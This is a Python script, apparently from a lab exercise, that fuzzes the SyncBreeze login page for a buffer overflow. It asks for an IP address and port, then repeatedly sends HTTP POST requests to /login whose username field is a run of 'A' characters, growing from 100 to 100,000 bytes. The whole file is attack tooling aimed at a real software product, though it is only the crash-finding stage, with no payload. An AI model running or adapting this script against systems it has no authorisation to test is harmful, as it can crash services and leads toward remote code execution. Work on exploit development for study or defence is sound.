#!/usr/bin/python3

import sys,socket
from time import sleep

print("***********SyncBreeze**********")
sleep(0.5)
ip_address=input("Enter the IP address:\n")
port_number=input("Enter port number:\n")

if (len(ip_address)<=0) or (len(port_number)<=0):
    if (len(ip_address)>0) and (len(port_number)<=0):
        print("*"*30)
        print("Port number field is empty")
    elif (len(ip_address)<=0) and (len(port_number)>0):
        print("*"*30)
        print("IP address field is empty")
    else:
        print("*"*30)
        print("Issues with the user input")
elif (len(ip_address)>0) and (len(port_number)>0):
    size=100
    while(size<=100000):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip_address, int(port_number)))
        content=b"username=" + b"A" *size + b"password=A"
        print(f"Sending buffer --> {size}")
        buffer=b"POST /login HTTP/1.1\r\n"
        buffer+=b"Host: 172.20.10.5\r\n"
        buffer+=b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\n"
        buffer+=b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
        buffer+=b"Accept-Language: en-US,en;q=0.5\r\n"
        buffer+=b"Accept-Encoding: gzip, deflate\r\n"
        buffer+=b"Content-Type: application/x-www-form-urlencoded\r\n"
        buffer+=b"Content-Length: "+str(len(content)).encode('utf-8')+b"\r\n"
        buffer+=b"Origin: http://172.20.10.5\r\n"
        buffer+=b"Connection: keep-alive\r\n"
        buffer+=b"Referer: http://172.20.10.5/login\r\n"
        buffer+=b"\r\n"

        buff=buffer+content
        s.send((buff))
        s.close()
        size=size+200
        sleep(3)
